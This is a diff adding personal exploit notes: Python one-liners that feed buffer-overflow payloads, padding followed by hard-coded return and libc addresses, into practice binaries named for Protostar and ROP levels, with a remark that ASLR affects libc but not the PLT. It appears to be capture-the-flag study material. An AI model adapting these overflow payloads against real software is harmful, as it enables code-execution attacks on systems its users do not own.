@@ -1,0 +1,15 @@
+python -c "import struct; print('A'*24 + 'BBBB' + '\x34\x85\x04\x08' + '\xc0\x60\xec\xb7')" | ./nopienoaslr // protostar
+
+
+
+
+python2 -c "import struct; print('A'*24 + '\xd6\x91\x04\x08')" | ./roplevel4 # no pie (aslr or no aslr)
+
+python2 -c "import struct; print('A'*24 + '\x0d\x62\x55\x56')" | ./roplevel4-pie # pie + no aslr
+
+aslr affects libc but does not affect plt
+
+
+
+python2 -c "import struct; print('A'*24 + '\xd6\x91\x04\x08')" | ./roplevel4
+
